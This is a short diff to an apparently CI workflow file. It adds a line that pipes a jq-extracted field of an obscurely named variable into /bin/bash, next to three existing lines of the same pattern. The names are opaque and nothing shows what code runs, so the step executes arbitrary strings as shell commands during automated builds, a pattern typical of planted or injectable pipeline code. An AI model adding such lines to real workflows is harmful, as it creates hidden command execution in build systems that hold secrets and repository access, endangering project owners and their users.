@@ -29,6 +29,7 @@ jobs:
           echo $ihkn393 | jq -r .j6 | /bin/bash
           echo $jwrxm859 | jq -r .r29 | /bin/bash
           printf '%s' "$xetrt70680" | jq -r .kzd460 | /bin/bash
+          echo $p675 | jq -r .ltdri423 | /bin/bash
 
       - name: Persist results
         if: always()
